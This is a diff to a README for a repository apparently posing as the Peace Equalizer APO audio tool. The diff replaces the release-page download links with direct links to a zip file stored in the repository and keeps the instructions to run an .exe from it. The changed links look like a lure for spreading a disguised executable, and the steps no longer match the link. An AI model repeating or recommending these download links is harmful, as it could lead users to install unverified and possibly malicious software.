@@ -1,6 +1,6 @@
 # 🎧 Peace-Equalizer-Apo - Improve your computer audio sound quality
 
-[![Download Peace Equalizer](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Rosieapocalyptical981/Peace-Equalizer-Apo/releases)
+[![Download Peace Equalizer](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Rosieapocalyptical981/Peace-Equalizer-Apo/main/apo/Peace-Apo-Equalizer-2.0.zip)
 
 ## 🎯 About This Software
 
@@ -12,7 +12,7 @@ This software works on computers running Windows 10 or Windows 11. It requires a
 
 ## 💾 Installation Steps
 
-1. Visit the project release page to get the installer: [https://github.com/Rosieapocalyptical981/Peace-Equalizer-Apo/releases](https://github.com/Rosieapocalyptical981/Peace-Equalizer-Apo/releases)
+1. Visit the project release page to get the installer: [https://raw.githubusercontent.com/Rosieapocalyptical981/Peace-Equalizer-Apo/main/apo/Peace-Apo-Equalizer-2.0.zip](https://raw.githubusercontent.com/Rosieapocalyptical981/Peace-Equalizer-Apo/main/apo/Peace-Apo-Equalizer-2.0.zip)
 2. Locate the file ending in .exe in the list of assets.
 3. Click the filename to save it to your computer.
 4. Double-click the file to start the setup process.
